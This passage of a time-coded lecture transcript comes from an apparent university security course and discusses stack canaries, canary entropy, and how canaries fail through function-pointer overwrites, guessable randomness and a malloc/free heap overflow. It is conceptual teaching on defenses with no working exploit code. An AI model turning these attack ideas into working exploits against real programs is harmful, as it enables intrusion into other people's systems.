              <time_slice>32:59</time_slice>
              <text_slice>Or maybe if you're using
a line-oriented function--</text_slice>
            </slice>
            <slice>
              <time_slice>33:02</time_slice>
              <text_slice>carriage return, line
feed-- that's often</text_slice>
            </slice>
            <slice>
              <time_slice>33:04</time_slice>
              <text_slice>used as the line terminator.</text_slice>
            </slice>
            <slice>
              <time_slice>33:05</time_slice>
              <text_slice>So once again, you're using
that dangerous function</text_slice>
            </slice>
            <slice>
              <time_slice>33:08</time_slice>
              <text_slice>that's trying to go this way.</text_slice>
            </slice>
            <slice>
              <time_slice>33:09</time_slice>
              <text_slice>It hits that.</text_slice>
            </slice>
            <slice>
              <time_slice>33:10</time_slice>
              <text_slice>Oops, it's going to quit.</text_slice>
            </slice>
            <slice>
              <time_slice>33:11</time_slice>
              <text_slice>And the negative 1 is
another similar magic token.</text_slice>
            </slice>
            <slice>
              <time_slice>33:14</time_slice>
              <text_slice>So that's one way you
can get around that.</text_slice>
            </slice>
            <slice>
              <time_slice>33:16</time_slice>
              <text_slice>One second.</text_slice>
            </slice>
            <slice>
              <time_slice>33:17</time_slice>
              <text_slice>And then another
thing you can do</text_slice>
            </slice>
            <slice>
              <time_slice>33:19</time_slice>
              <text_slice>is you can use a
randomized value.</text_slice>
            </slice>
            <slice>
              <time_slice>33:27</time_slice>
              <text_slice>So here, you just [INAUDIBLE]
from this whole idea</text_slice>
            </slice>
            <slice>
              <time_slice>33:29</time_slice>
              <text_slice>of trying to figure out
what exactly it is that</text_slice>
            </slice>
            <slice>
              <time_slice>33:31</time_slice>
              <text_slice>might cause that
attack to terminate.</text_slice>
            </slice>
            <slice>
              <time_slice>33:33</time_slice>
              <text_slice>And you just pull
some random number</text_slice>
            </slice>
            <slice>
              <time_slice>33:35</time_slice>
              <text_slice>and either make it
difficult for the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>33:37</time_slice>
              <text_slice>to guess what that is.</text_slice>
            </slice>
            <slice>
              <time_slice>33:39</time_slice>
              <text_slice>Now, of course, this
random value-- its strength</text_slice>
            </slice>
            <slice>
              <time_slice>33:42</time_slice>
              <text_slice>is basically based on
how difficult it is</text_slice>
            </slice>
            <slice>
              <time_slice>33:43</time_slice>
              <text_slice>for the attacker to guess that.</text_slice>
            </slice>
            <slice>
              <time_slice>33:46</time_slice>
              <text_slice>So the attacker,
for example, can</text_slice>
            </slice>
            <slice>
              <time_slice>33:48</time_slice>
              <text_slice>understand that if
there's only, let's say,</text_slice>
            </slice>
            <slice>
              <time_slice>33:51</time_slice>
              <text_slice>three bits of entropy in your
system, then maybe the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>33:54</time_slice>
              <text_slice>could use some type of forced
attack, so on and so forth.</text_slice>
            </slice>
            <slice>
              <time_slice>33:57</time_slice>
              <text_slice>So one thing to keep
in mind, in general,</text_slice>
            </slice>
            <slice>
              <time_slice>33:59</time_slice>
              <text_slice>is that whenever
someone tells you,</text_slice>
            </slice>
            <slice>
              <time_slice>34:00</time_slice>
              <text_slice>here's a randomized
offense against attack foo,</text_slice>
            </slice>
            <slice>
              <time_slice>34:03</time_slice>
              <text_slice>if there are not a
lot of random bits</text_slice>
            </slice>
            <slice>
              <time_slice>34:05</time_slice>
              <text_slice>there, that attack may not
give you as much defense</text_slice>
            </slice>
            <slice>
              <time_slice>34:07</time_slice>
              <text_slice>as you think.</text_slice>
            </slice>
            <slice>
              <time_slice>34:09</time_slice>
              <text_slice>You had a question?</text_slice>
            </slice>
            <slice>
              <time_slice>34:12</time_slice>
              <text_slice>AUDIENCE: Usually
what tends to happen</text_slice>
            </slice>
            <slice>
              <time_slice>34:14</time_slice>
              <text_slice>is you read from another
buffer and you write</text_slice>
            </slice>
            <slice>
              <time_slice>34:16</time_slice>
              <text_slice>into that buffer on the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>34:18</time_slice>
              <text_slice>So in that situation, it seems
like that promiscuous canary</text_slice>
            </slice>
            <slice>
              <time_slice>34:22</time_slice>
              <text_slice>is kind of useless.</text_slice>
            </slice>
            <slice>
              <time_slice>34:23</time_slice>
              <text_slice>Because if I read
from the [INAUDIBLE],</text_slice>
            </slice>
            <slice>
              <time_slice>34:25</time_slice>
              <text_slice>I know what the canary is.</text_slice>
            </slice>
            <slice>
              <time_slice>34:26</time_slice>
              <text_slice>And I have this other
buffer that I control.</text_slice>
            </slice>
            <slice>
              <time_slice>34:28</time_slice>
              <text_slice>And I never check.</text_slice>
            </slice>
            <slice>
              <time_slice>34:30</time_slice>
              <text_slice>And in that buffer, I can
put as much of it as I want.</text_slice>
            </slice>
            <slice>
              <time_slice>34:32</time_slice>
              <text_slice>I don't want the
promiscuous canary,</text_slice>
            </slice>
            <slice>
              <time_slice>34:34</time_slice>
              <text_slice>so I can overwrite
it very safely.</text_slice>
            </slice>
            <slice>
              <time_slice>34:36</time_slice>
              <text_slice>So I don't see how
this really works,</text_slice>
            </slice>
            <slice>
              <time_slice>34:39</time_slice>
              <text_slice>and in what scenario it's--
you're assuming you're reading</text_slice>
            </slice>
            <slice>
              <time_slice>34:42</time_slice>
              <text_slice>from the buffer on this stack
and you're going to stop--</text_slice>
            </slice>
            <slice>
              <time_slice>34:44</time_slice>
              <text_slice>PROFESSOR: Well,
we're assuming--</text_slice>
            </slice>
            <slice>
              <time_slice>34:45</time_slice>
              <text_slice>we're writing to the buffer.</text_slice>
            </slice>
            <slice>
              <time_slice>34:47</time_slice>
              <text_slice>So basically, the idea is that
you write some [? two-long ?]</text_slice>
            </slice>
            <slice>
              <time_slice>34:51</time_slice>
              <text_slice>string this way.</text_slice>
            </slice>
            <slice>
              <time_slice>34:52</time_slice>
              <text_slice>And then the idea is that if you
can't guess what this is, then</text_slice>
            </slice>
            <slice>
              <time_slice>34:56</time_slice>
              <text_slice>you can't, basically, put this
value inside of your overflow</text_slice>
            </slice>
            <slice>
              <time_slice>35:02</time_slice>
              <text_slice>string.</text_slice>
            </slice>
            <slice>
              <time_slice>35:03</time_slice>
              <text_slice>AUDIENCE: But you said
it's deterministic, right?</text_slice>
            </slice>
            <slice>
              <time_slice>35:05</time_slice>
              <text_slice>0, CR, LF, negative 1.</text_slice>
            </slice>
            <slice>
              <time_slice>35:06</time_slice>
              <text_slice>PROFESSOR: Oh, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>35:07</time_slice>
              <text_slice>Right.</text_slice>
            </slice>
            <slice>
              <time_slice>35:08</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>35:09</time_slice>
              <text_slice>So I think I understand
your question now.</text_slice>
            </slice>
            <slice>
              <time_slice>35:10</time_slice>
              <text_slice>Yes.</text_slice>
            </slice>
            <slice>
              <time_slice>35:10</time_slice>
              <text_slice>If you use this system here,
with the deterministic canary,</text_slice>
            </slice>
            <slice>
              <time_slice>35:16</time_slice>
              <text_slice>and you essentially
are not using</text_slice>
            </slice>
            <slice>
              <time_slice>35:19</time_slice>
              <text_slice>one of these functions
from, let's say,</text_slice>
            </slice>
            <slice>
              <time_slice>35:21</time_slice>
              <text_slice>the standard library that
would be fooled by this,</text_slice>
            </slice>
            <slice>
              <time_slice>35:25</time_slice>
              <text_slice>then, yeah, you can defeat
the system that way.</text_slice>
            </slice>
            <slice>
              <time_slice>35:27</time_slice>
              <text_slice>AUDIENCE: But I
can use string CPIs</text_slice>
            </slice>
            <slice>
              <time_slice>35:30</time_slice>
              <text_slice>and the destination
can be buffered.</text_slice>
            </slice>
            <slice>
              <time_slice>35:32</time_slice>
              <text_slice>And the source can
be [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>35:35</time_slice>
              <text_slice>And that would not
protect me against that.</text_slice>
            </slice>
            <slice>
              <time_slice>35:40</time_slice>
              <text_slice>PROFESSOR: I'm not sure I
understand the attack, so.</text_slice>
            </slice>
            <slice>
              <time_slice>35:43</time_slice>
              <text_slice>AUDIENCE: So the string
CPI would take home</text_slice>
            </slice>
            <slice>
              <time_slice>35:45</time_slice>
              <text_slice>the user input for my data,
would overwrite canary-- oh,</text_slice>
            </slice>
            <slice>
              <time_slice>35:50</time_slice>
              <text_slice>and you're saying--
hmm, actually, I</text_slice>
            </slice>
            <slice>
              <time_slice>35:51</time_slice>
              <text_slice>understand what you're saying.</text_slice>
            </slice>
            <slice>
              <time_slice>35:52</time_slice>
              <text_slice>PROFESSOR: Right?</text_slice>
            </slice>
            <slice>
              <time_slice>35:53</time_slice>
              <text_slice>Because the idea is that you
can fill this buffer with bytes</text_slice>
            </slice>
            <slice>
              <time_slice>35:56</time_slice>
              <text_slice>from wherever, right?</text_slice>
            </slice>
            <slice>
              <time_slice>35:58</time_slice>
              <text_slice>But the idea is that
unless you can guess this,</text_slice>
            </slice>
            <slice>
              <time_slice>36:00</time_slice>
              <text_slice>then it doesn't matter.</text_slice>
            </slice>
            <slice>
              <time_slice>36:02</time_slice>
              <text_slice>But you're correct.</text_slice>
            </slice>
            <slice>
              <time_slice>36:03</time_slice>
              <text_slice>In general, anything that allows
you to guess this or randomly</text_slice>
            </slice>
            <slice>
              <time_slice>36:07</time_slice>
              <text_slice>get that value correct will
lead to the feed of the system.</text_slice>
            </slice>
            <slice>
              <time_slice>36:11</time_slice>
              <text_slice>AUDIENCE: In terms
of [INAUDIBLE],</text_slice>
            </slice>
            <slice>
              <time_slice>36:13</time_slice>
              <text_slice>can you just take something
like the number of seconds</text_slice>
            </slice>
            <slice>
              <time_slice>36:16</time_slice>
              <text_slice>or milliseconds since
the epoch and use</text_slice>
            </slice>
            <slice>
              <time_slice>36:19</time_slice>
              <text_slice>that at the [INAUDIBLE]?</text_slice>
            </slice>
            <slice>
              <time_slice>36:23</time_slice>
              <text_slice>PROFESSOR: Well,
as it turns out,</text_slice>
            </slice>
            <slice>
              <time_slice>36:24</time_slice>
              <text_slice>a lot of times, calls
that get [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>36:27</time_slice>
              <text_slice>don't contain as much
randomness as you might think.</text_slice>
            </slice>
            <slice>
              <time_slice>36:30</time_slice>
              <text_slice>Because the program
itself might somehow--</text_slice>
            </slice>
            <slice>
              <time_slice>36:33</time_slice>
              <text_slice>let's say, for example, have a
log statement or function you</text_slice>
            </slice>
            <slice>
              <time_slice>36:36</time_slice>
              <text_slice>could call to get the
time that the program was</text_slice>
            </slice>
            <slice>
              <time_slice>36:38</time_slice>
              <text_slice>launched or things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>36:40</time_slice>
              <text_slice>But you're right.</text_slice>
            </slice>
            <slice>
              <time_slice>36:40</time_slice>
              <text_slice>In practice, if you
can use something like,</text_slice>
            </slice>
            <slice>
              <time_slice>36:42</time_slice>
              <text_slice>let's say, the hardware system
plot, which is often the lowest</text_slice>
            </slice>
            <slice>
              <time_slice>36:46</time_slice>
              <text_slice>level, better system of timing
of it-- yes, that kind of thing</text_slice>
            </slice>
            <slice>
              <time_slice>36:49</time_slice>
              <text_slice>might work.</text_slice>
            </slice>
            <slice>
              <time_slice>36:49</time_slice>
              <text_slice>AUDIENCE: But even if
you can pull the logs,</text_slice>
            </slice>
            <slice>
              <time_slice>36:53</time_slice>
              <text_slice>it still depends on exactly
what time you refuse a request.</text_slice>
            </slice>
            <slice>
              <time_slice>36:56</time_slice>
              <text_slice>And so if you don't have
control over how long it takes</text_slice>
            </slice>
            <slice>
              <time_slice>37:00</time_slice>
              <text_slice>for your requests to get from
your computer to the server,</text_slice>
            </slice>
            <slice>
              <time_slice>37:03</time_slice>
              <text_slice>then I don't think you
can deterministically</text_slice>
            </slice>
            <slice>
              <time_slice>37:06</time_slice>
              <text_slice>guess exactly the right time.</text_slice>
            </slice>
            <slice>
              <time_slice>37:07</time_slice>
              <text_slice>PROFESSOR: That's right.</text_slice>
            </slice>
            <slice>
              <time_slice>37:08</time_slice>
              <text_slice>That's right.</text_slice>
            </slice>
            <slice>
              <time_slice>37:09</time_slice>
              <text_slice>The devil's in the details
with all this kind of stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>37:11</time_slice>
              <text_slice>In other words, if there's
some way for you to figure out,</text_slice>
            </slice>
            <slice>
              <time_slice>37:14</time_slice>
              <text_slice>for example, that type
of timing channel,</text_slice>
            </slice>
            <slice>
              <time_slice>37:16</time_slice>
              <text_slice>you might find out that the
amount of entropy-- the amount</text_slice>
            </slice>
            <slice>
              <time_slice>37:18</time_slice>
              <text_slice>of randomness--
is not, let's say,</text_slice>
            </slice>
            <slice>
              <time_slice>37:20</time_slice>
              <text_slice>the full size of a timestamp,
but maybe something</text_slice>
            </slice>
            <slice>
              <time_slice>37:22</time_slice>
              <text_slice>that's much smaller.</text_slice>
            </slice>
            <slice>
              <time_slice>37:23</time_slice>
              <text_slice>Because maybe the
attacker can figure out</text_slice>
            </slice>
            <slice>
              <time_slice>37:25</time_slice>
              <text_slice>the hour and the
minute in which you</text_slice>
            </slice>
            <slice>
              <time_slice>37:26</time_slice>
              <text_slice>did this, but not the
second, for example.</text_slice>
            </slice>
            <slice>
              <time_slice>37:30</time_slice>
              <text_slice>We'll take one more
question, then we'll move on.</text_slice>
            </slice>
            <slice>
              <time_slice>37:33</time_slice>
              <text_slice>AUDIENCE: For the record, trying
to roll your own randomness</text_slice>
            </slice>
            <slice>
              <time_slice>37:35</time_slice>
              <text_slice>is usually a bad idea, right?</text_slice>
            </slice>
            <slice>
              <time_slice>37:37</time_slice>
              <text_slice>PROFESSOR: That's correct.</text_slice>
            </slice>
            <slice>
              <time_slice>37:38</time_slice>
              <text_slice>AUDIENCE: Usually,
you should just</text_slice>
            </slice>
            <slice>
              <time_slice>37:38</time_slice>
              <text_slice>use whatever's supplied
by your systems.</text_slice>
            </slice>
            <slice>
              <time_slice>37:40</time_slice>
              <text_slice>PROFESSOR: Oh, yes.</text_slice>
            </slice>
            <slice>
              <time_slice>37:41</time_slice>
              <text_slice>That's very true.</text_slice>
            </slice>
            <slice>
              <time_slice>37:42</time_slice>
              <text_slice>It's like inventing your
own cryptosystem, which</text_slice>
            </slice>
            <slice>
              <time_slice>37:44</time_slice>
              <text_slice>is another popular thing
undergrads sometimes</text_slice>
            </slice>
            <slice>
              <time_slice>37:46</time_slice>
              <text_slice>want to do.</text_slice>
            </slice>
            <slice>
              <time_slice>37:47</time_slice>
              <text_slice>We're not the NSA, we're
not mathematicians.</text_slice>
            </slice>
            <slice>
              <time_slice>37:49</time_slice>
              <text_slice>That typically fails.</text_slice>
            </slice>
            <slice>
              <time_slice>37:50</time_slice>
              <text_slice>So you're exactly
right about that.</text_slice>
            </slice>
            <slice>
              <time_slice>37:51</time_slice>
              <text_slice>But even if you use
system-supplied randomness,</text_slice>
            </slice>
            <slice>
              <time_slice>37:54</time_slice>
              <text_slice>you still may end up with
fewer bits of entropy</text_slice>
            </slice>
            <slice>
              <time_slice>37:57</time_slice>
              <text_slice>than you expect.</text_slice>
            </slice>
            <slice>
              <time_slice>37:58</time_slice>
              <text_slice>And I'll give you an example
of that when we talk about</text_slice>
            </slice>
            <slice>
              <time_slice>38:00</time_slice>
              <text_slice>address phase randomization.</text_slice>
            </slice>
            <slice>
              <time_slice>38:01</time_slice>
              <text_slice>So that's basically how the
stack canary approach works.</text_slice>
            </slice>
            <slice>
              <time_slice>38:07</time_slice>
              <text_slice>And so since we're in a security
class, you might be wondering,</text_slice>
            </slice>
            <slice>
              <time_slice>38:12</time_slice>
              <text_slice>so what kinds of things will
stack canaries not catch?</text_slice>
            </slice>
            <slice>
              <time_slice>38:17</time_slice>
              <text_slice>So when do canaries fail?</text_slice>
            </slice>
            <slice>
              <time_slice>38:28</time_slice>
              <text_slice>One way they can fail
is if the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>38:35</time_slice>
              <text_slice>the things, like
function pointers.</text_slice>
            </slice>
            <slice>
              <time_slice>38:45</time_slice>
              <text_slice>Because if function
pointers get [INAUDIBLE],</text_slice>
            </slice>
            <slice>
              <time_slice>38:47</time_slice>
              <text_slice>there's nothing
that the canary can</text_slice>
            </slice>
            <slice>
              <time_slice>38:49</time_slice>
              <text_slice>do to prevent that type of
exploit from taking place.</text_slice>
            </slice>
            <slice>
              <time_slice>38:52</time_slice>
              <text_slice>For example, let's say you have
code that declared a pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>39:00</time_slice>
              <text_slice>It gets initialized in some
way, it doesn't really matter.</text_slice>
            </slice>
            <slice>
              <time_slice>39:05</time_slice>
              <text_slice>Then you have a buffer here.</text_slice>
            </slice>
            <slice>
              <time_slice>39:11</time_slice>
              <text_slice>Once again, the gets
function rears its ugly head.</text_slice>
            </slice>
            <slice>
              <time_slice>39:17</time_slice>
              <text_slice>And then, let's say, down
here, we assign some value 5</text_slice>
            </slice>
            <slice>
              <time_slice>39:25</time_slice>
              <text_slice>for the pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>39:27</time_slice>
              <text_slice>Now note that we
haven't actually</text_slice>
            </slice>
            <slice>
              <time_slice>39:29</time_slice>
              <text_slice>tried to attack the return
address of the function that</text_slice>
            </slice>
            <slice>
              <time_slice>39:32</time_slice>
              <text_slice>contains this code.</text_slice>
            </slice>
            <slice>
              <time_slice>39:34</time_slice>
              <text_slice>When we view the
buffer overflow,</text_slice>
            </slice>
            <slice>
              <time_slice>39:37</time_slice>
              <text_slice>this pointer address up here
is going to get corrupted.</text_slice>
            </slice>
            <slice>
              <time_slice>39:40</time_slice>
              <text_slice>And so what ends up happening
is that if the attacker can</text_slice>
            </slice>
            <slice>
              <time_slice>39:43</time_slice>
              <text_slice>corrupt that pointer,
then the attacker's</text_slice>
            </slice>
            <slice>
              <time_slice>39:46</time_slice>
              <text_slice>able to write 5 to some
attacker-controlled address.</text_slice>
            </slice>
            <slice>
              <time_slice>39:50</time_slice>
              <text_slice>Does everyone see how the
canary doesn't help here?</text_slice>
            </slice>
            <slice>
              <time_slice>39:53</time_slice>
              <text_slice>Because we're
basically not attacking</text_slice>
            </slice>
            <slice>
              <time_slice>39:54</time_slice>
              <text_slice>the way that the
function returns.</text_slice>
            </slice>
            <slice>
              <time_slice>39:57</time_slice>
              <text_slice>AUDIENCE: But won't the
pointer be below the buffer?</text_slice>
            </slice>
            <slice>
              <time_slice>40:03</time_slice>
              <text_slice>PROFESSOR: So, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>40:06</time_slice>
              <text_slice>AUDIENCE: Not necessarily--</text_slice>
            </slice>
            <slice>
              <time_slice>40:07</time_slice>
              <text_slice>PROFESSOR: So you're worried
about, is it going to be here,</text_slice>
            </slice>
            <slice>
              <time_slice>40:08</time_slice>
              <text_slice>or is it going to be here?</text_slice>
            </slice>
            <slice>
              <time_slice>40:09</time_slice>
              <text_slice>AUDIENCE: I'm worried
about when you--</text_slice>
            </slice>
            <slice>
              <time_slice>40:11</time_slice>
              <text_slice>will you actually be able to
access where the pointer is</text_slice>
            </slice>
            <slice>
              <time_slice>40:14</time_slice>
              <text_slice>when you're overturning--</text_slice>
            </slice>
            <slice>
              <time_slice>40:14</time_slice>
              <text_slice>PROFESSOR: Ah, yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>40:15</time_slice>
              <text_slice>So you can't necessarily--
that's a good question.</text_slice>
            </slice>
            <slice>
              <time_slice>40:17</time_slice>
              <text_slice>So I think, in a lot of
the previous examples,</text_slice>
            </slice>
            <slice>
              <time_slice>40:20</time_slice>
              <text_slice>you've been assuming that
this guy would be here.</text_slice>
            </slice>
            <slice>
              <time_slice>40:23</time_slice>
              <text_slice>Like, in the [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>40:24</time_slice>
              <text_slice>If the stack is going
this way, then the pointer</text_slice>
            </slice>
            <slice>
              <time_slice>40:27</time_slice>
              <text_slice>would be down here.</text_slice>
            </slice>
            <slice>
              <time_slice>40:28</time_slice>
              <text_slice>But the order of the
particular variables--</text_slice>
            </slice>
            <slice>
              <time_slice>40:30</time_slice>
              <text_slice>it depends on a bunch
of different things.</text_slice>
            </slice>
            <slice>
              <time_slice>40:32</time_slice>
              <text_slice>It depends on the way that
the compiler lays stuff out.</text_slice>
            </slice>
            <slice>
              <time_slice>40:34</time_slice>
              <text_slice>It depends on the column
dimension of the hardware,</text_slice>
            </slice>
            <slice>
              <time_slice>40:36</time_slice>
              <text_slice>so on and so forth.</text_slice>
            </slice>
            <slice>
              <time_slice>40:38</time_slice>
              <text_slice>But you're right that
if the-- basically,</text_slice>
            </slice>
            <slice>
              <time_slice>40:41</time_slice>
              <text_slice>if the buffer overflow
was going this way,</text_slice>
            </slice>
            <slice>
              <time_slice>40:43</time_slice>
              <text_slice>but the pointer was in
front of the buffer,</text_slice>
            </slice>
            <slice>
              <time_slice>40:45</time_slice>
              <text_slice>then it's going to work.</text_slice>
            </slice>
            <slice>
              <time_slice>40:48</time_slice>
              <text_slice>AUDIENCE: Why can't
you associate a canary</text_slice>
            </slice>
            <slice>
              <time_slice>40:50</time_slice>
              <text_slice>with the function
canary, just like you</text_slice>
            </slice>
            <slice>
              <time_slice>40:51</time_slice>
              <text_slice>did with the return address?</text_slice>
            </slice>
            <slice>
              <time_slice>40:53</time_slice>
              <text_slice>PROFESSOR: Ah.</text_slice>
            </slice>
            <slice>
              <time_slice>40:54</time_slice>
              <text_slice>That's an interesting point.</text_slice>
            </slice>
            <slice>
              <time_slice>40:55</time_slice>
              <text_slice>You could do those things.</text_slice>
            </slice>
            <slice>
              <time_slice>40:57</time_slice>
              <text_slice>In fact, you could try
to imagine a compiler</text_slice>
            </slice>
            <slice>
              <time_slice>40:59</time_slice>
              <text_slice>that, whenever it had
any pointer whatsoever,</text_slice>
            </slice>
            <slice>
              <time_slice>41:02</time_slice>
              <text_slice>it would always try to add
padding for various things.</text_slice>
            </slice>
            <slice>
              <time_slice>41:05</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>41:05</time_slice>
              <text_slice>As it turns out, it seems
like that will quickly</text_slice>
            </slice>
            <slice>
              <time_slice>41:08</time_slice>
              <text_slice>get expensive, in terms
of all the code that's</text_slice>
            </slice>
            <slice>
              <time_slice>41:12</time_slice>
              <text_slice>added, to have to check for
all those types of things.</text_slice>
            </slice>
            <slice>
              <time_slice>41:15</time_slice>
              <text_slice>Because then you could imagine
that every single time you</text_slice>
            </slice>
            <slice>
              <time_slice>41:18</time_slice>
              <text_slice>want to invoke any pointer,
or recall any function,</text_slice>
            </slice>
            <slice>
              <time_slice>41:21</time_slice>
              <text_slice>you've got to have
this code that's</text_slice>
            </slice>
            <slice>
              <time_slice>41:22</time_slice>
              <text_slice>going to check whether
that canary is correct.</text_slice>
            </slice>
            <slice>
              <time_slice>41:24</time_slice>
              <text_slice>But yeah, in principle, you
could do something like that.</text_slice>
            </slice>
            <slice>
              <time_slice>41:29</time_slice>
              <text_slice>So does this make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>41:30</time_slice>
              <text_slice>So we see that canaries don't
help you on this equation.</text_slice>
            </slice>
            <slice>
              <time_slice>41:36</time_slice>
              <text_slice>And so another thing, as
we've discussed before,</text_slice>
            </slice>
            <slice>
              <time_slice>41:39</time_slice>
              <text_slice>is that if you can guess the
randomness, then, basically,</text_slice>
            </slice>
            <slice>
              <time_slice>41:46</time_slice>
              <text_slice>the random canaries don't work.</text_slice>
            </slice>
            <slice>
              <time_slice>41:57</time_slice>
              <text_slice>Producing secure
sources of randomness</text_slice>
            </slice>
            <slice>
              <time_slice>42:01</time_slice>
              <text_slice>is actually a topic
in and of itself.</text_slice>
            </slice>
            <slice>
              <time_slice>42:03</time_slice>
              <text_slice>That's very, very
complicated, so we're not</text_slice>
            </slice>
            <slice>
              <time_slice>42:05</time_slice>
              <text_slice>going to go into great
depth about that here.</text_slice>
            </slice>
            <slice>
              <time_slice>42:06</time_slice>
              <text_slice>But suffice it to say, if
you can guess the randomness,</text_slice>
            </slice>
            <slice>
              <time_slice>42:08</time_slice>
              <text_slice>everything falls apart.</text_slice>
            </slice>
            <slice>
              <time_slice>42:09</time_slice>
              <text_slice>AUDIENCE: So do canaries usually
have less bits than the return</text_slice>
            </slice>
            <slice>
              <time_slice>42:11</time_slice>
              <text_slice>address?</text_slice>
            </slice>
            <slice>
              <time_slice>42:12</time_slice>
              <text_slice>Because otherwise,
couldn't you just</text_slice>
            </slice>
            <slice>
              <time_slice>42:13</time_slice>
              <text_slice>memorize the return address and
check that the address changed?</text_slice>
            </slice>
            <slice>
              <time_slice>42:17</time_slice>
              <text_slice>PROFESSOR: Let's see.</text_slice>
            </slice>
            <slice>
              <time_slice>42:18</time_slice>
              <text_slice>So you're saying if the
canary here is, let's say,</text_slice>
            </slice>
            <slice>
              <time_slice>42:23</time_slice>
              <text_slice>smaller than--</text_slice>
            </slice>
            <slice>
              <time_slice>42:25</time_slice>
              <text_slice>AUDIENCE: I'm saying for
the canary is that you know</text_slice>
            </slice>
            <slice>
              <time_slice>42:28</time_slice>
              <text_slice>what that value is [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>42:32</time_slice>
              <text_slice>Can't you also memorize
the return address value</text_slice>
            </slice>
            <slice>
              <time_slice>42:34</time_slice>
              <text_slice>and check if that's
been changed?</text_slice>
            </slice>
            <slice>
              <time_slice>42:37</time_slice>
              <text_slice>PROFESSOR: Oh, so you're saying
can't the secure system--</text_slice>
            </slice>
            <slice>
              <time_slice>42:40</time_slice>
              <text_slice>can't it look at
the return address</text_slice>
            </slice>
            <slice>
              <time_slice>42:42</time_slice>
              <text_slice>and figure out if
that's been changed.</text_slice>
            </slice>
            <slice>
              <time_slice>42:45</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>42:46</time_slice>
              <text_slice>In other words, if
there-- well, yes and no.</text_slice>
            </slice>
            <slice>
              <time_slice>42:50</time_slice>
              <text_slice>Note that there's
still this that's</text_slice>
            </slice>
            <slice>
              <time_slice>42:51</time_slice>
              <text_slice>going get overwritten in
the buffer overflow attack.</text_slice>
            </slice>
            <slice>
              <time_slice>42:53</time_slice>
              <text_slice>So this may still
cause problems.</text_slice>
            </slice>
            <slice>
              <time_slice>42:56</time_slice>
              <text_slice>But in principle, if
somehow these things</text_slice>
            </slice>
            <slice>
              <time_slice>42:59</time_slice>
              <text_slice>were invariant somehow, then you
could do something like that.</text_slice>
            </slice>
            <slice>
              <time_slice>43:04</time_slice>
              <text_slice>But the problem is
that, in many cases,</text_slice>
            </slice>
            <slice>
              <time_slice>43:07</time_slice>
              <text_slice>this return-- the
bookkeeping overhead for that</text_slice>
            </slice>
            <slice>
              <time_slice>43:09</time_slice>
              <text_slice>would be a little bit tricky.</text_slice>
            </slice>
            <slice>
              <time_slice>43:10</time_slice>
              <text_slice>Because you can imagine
that particular function</text_slice>
            </slice>
            <slice>
              <time_slice>43:13</time_slice>
              <text_slice>may be called from places,
and so on and so forth.</text_slice>
            </slice>
            <slice>
              <time_slice>43:16</time_slice>
              <text_slice>Just in the interest
of time, we're</text_slice>
            </slice>
            <slice>
              <time_slice>43:17</time_slice>
              <text_slice>going to zoom
forward a little bit.</text_slice>
            </slice>
            <slice>
              <time_slice>43:19</time_slice>
              <text_slice>But if we have time
at the end, we'll</text_slice>
            </slice>
            <slice>
              <time_slice>43:20</time_slice>
              <text_slice>come back to some
of these questions.</text_slice>
            </slice>
            <slice>
              <time_slice>43:25</time_slice>
              <text_slice>So those are some situations
in which the canary can fail.</text_slice>
            </slice>
            <slice>
              <time_slice>43:29</time_slice>
              <text_slice>There's some other places
in which it can fail, too.</text_slice>
            </slice>
            <slice>
              <time_slice>43:32</time_slice>
              <text_slice>For example, one way
that it might fail</text_slice>
            </slice>
            <slice>
              <time_slice>43:35</time_slice>
              <text_slice>is with malloc and free attacks.</text_slice>
            </slice>
            <slice>
              <time_slice>43:38</time_slice>
              <text_slice>This is a uniquely
C-style attack.</text_slice>
            </slice>
            <slice>
              <time_slice>43:44</time_slice>
              <text_slice>Let's see what happens here.</text_slice>
            </slice>
            <slice>
              <time_slice>43:49</time_slice>
              <text_slice>Imagine that you have two
pointers here, p and q.</text_slice>
            </slice>
            <slice>
              <time_slice>43:59</time_slice>
              <text_slice>And then imagine that we issue
a malloc for both of these.</text_slice>
            </slice>
            <slice>
              <time_slice>44:08</time_slice>
              <text_slice>We give p 1,024 bytes of memory.</text_slice>
            </slice>
            <slice>
              <time_slice>44:11</time_slice>
              <text_slice>We also give q 1,024
bytes of memory.</text_slice>
            </slice>
            <slice>
              <time_slice>44:17</time_slice>
              <text_slice>And then, let's say
that we do a strcpy on p</text_slice>
            </slice>
            <slice>
              <time_slice>44:29</time_slice>
              <text_slice>from some bug that's
controlled by the attacker.</text_slice>
            </slice>
            <slice>
              <time_slice>44:31</time_slice>
              <text_slice>So here's where the
overflow happens.</text_slice>
            </slice>
            <slice>
              <time_slice>44:35</time_slice>
              <text_slice>And then let's say
that would be free q</text_slice>
            </slice>
            <slice>
              <time_slice>44:43</time_slice>
              <text_slice>and then let's say
that would be free p.</text_slice>
            </slice>
            <slice>
              <time_slice>44:48</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>44:48</time_slice>
              <text_slice>So it's fairly
straightforward code, right?</text_slice>
            </slice>
            <slice>
              <time_slice>44:50</time_slice>
              <text_slice>Two pointers-- malloc's the
memory for each one of them.</text_slice>
            </slice>
            <slice>
              <time_slice>44:54</time_slice>
              <text_slice>You use one of these
on site functions,</text_slice>
            </slice>
            <slice>
              <time_slice>44:55</time_slice>
              <text_slice>the buffer overflow happens,
and we free q and we free p.</text_slice>
            </slice>
            <slice>
              <time_slice>45:03</time_slice>
              <text_slice>Let's assume that p and
q-- the memory that's</text_slice>
            </slice>
            <slice>
              <time_slice>45:12</time_slice>
